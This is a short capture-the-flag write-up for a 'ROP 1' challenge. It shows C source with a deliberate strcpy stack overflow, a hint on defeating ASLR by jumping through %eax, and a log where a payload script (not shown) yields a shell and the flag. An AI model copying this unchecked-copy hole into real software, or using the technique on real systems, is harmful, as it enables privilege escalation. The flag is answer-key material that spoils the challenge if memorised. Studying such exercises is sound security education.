ROP 1 - 100
============

### Desc:
This binary is running on a machine with ASLR! Can you bypass it? The binary can be found at /home/rop1/ on the shell server. The source can be found here.

###  Hint:
ASLR is hard to beat if you need to predict an address, but what if you don't? What does %eax contain when vuln returns? Is there any code in the program which calls or jumps to it?


###  Vulnerable code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

void vuln(char *name){
    char buf[64];
    strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc > 1)
        vuln(argv[1]);
    return 0;
}
```

### Getting the flag:
```
$ ./rop1 $(python /tmp/sigsegv/rop1.py)
$ id
uid=13315(pico22418) gid=1004(rop1) groups=1017(picogroup)
$ cat flag.txt
theres_no_need_to_guess
```
